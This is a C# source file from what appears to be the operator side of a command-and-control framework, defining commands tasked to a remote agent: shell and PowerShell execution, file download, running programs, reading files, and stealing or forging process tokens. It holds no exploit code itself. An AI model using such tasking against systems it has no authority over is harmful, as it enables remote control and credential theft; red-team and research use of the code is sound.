using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Agent
{
    public abstract class SimpleEndPointCommand : ExecutorCommand
    {
        public override string Category => CommandCategory.Core;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
        protected override void InnerExecute(CommandContext context)
        {
            context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name, context.CommandParameters).Wait();
            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
        }
    }

    public abstract class MetaEndPointCommand : SimpleEndPointCommand
    {
        public override string Description => "Ask to refresh Metadata";
        public override string Name => EndPointCommand.META;
    }



    public class ShellCommand : SimpleEndPointCommand
    {
        public override string Description => "Send a command to be executed by the agent shell";
        public override string Name => EndPointCommand.SHELL;
    }

    public class WgetCommand : SimpleEndPointCommand
    {
        public override string Description => "Download a page or file from an URL";
        public override string Name => EndPointCommand.WGET;
    }

    public class PowerShellCommand : SimpleEndPointCommand
    {
        public override string Description => "Send a command to be executed by the agent shell";
        public override string Name => EndPointCommand.POWERSHELL;
    }

    public class RunCommand : SimpleEndPointCommand
    {
        public override string Description => "Run an executable/command on the agent";
        public override string Name => EndPointCommand.RUN;
    }

    public class StartCommand : SimpleEndPointCommand
    {
        public override string Description => "Start an executable/command on the agent";
        public override string Name => EndPointCommand.START;
    }

    public class CATCommand : SimpleEndPointCommand
    {
        public override string Description => "Display the content of a file";
        public override string Name => EndPointCommand.CAT;
    }

    public class SERVICECommand : SimpleEndPointCommand
    {
        public override string Description => "Display the services";
        public override string Name => EndPointCommand.SERVICE;
    }

    public class StealTokenCommand : SimpleEndPointCommand
    {
        public override string Description => "Steal the token of a process";
        public override string Name => EndPointCommand.STEAL_TOKEN;
    }

    public class MakeTokenCommand : SimpleEndPointCommand
    {
        public override string Description => "Make token for a specified user";
        public override string Name => EndPointCommand.MAKE_TOKEN;
    }

    public class Rev2SelfCommand : SimpleEndPointCommand
    {
        public override string Description => "Make token for a specified user";
        public override string Name => EndPointCommand.REVERT_SELF;
    }

}
